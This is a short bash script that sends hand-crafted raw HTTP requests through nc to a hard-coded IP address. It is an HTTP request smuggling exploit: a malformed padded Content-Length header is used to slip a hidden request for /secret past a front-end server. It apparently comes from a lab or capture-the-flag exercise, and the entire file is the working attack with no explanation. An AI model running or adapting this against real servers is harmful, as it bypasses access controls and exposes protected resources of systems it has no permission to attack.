#!/bin/bash

(printf "POST / HTTP/1.1\r\nHost: 3.82.106.93\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length:28\r\n\r\n"; sleep 1;
printf "GET /secret HTTP/1.1\r\n"\
"DUMMY:"; sleep 1; printf "GET /abcd HTTP/1.1\r\n"\
"Host: 3.82.106.93\r\n\r\n") | nc 3.82.106.93 80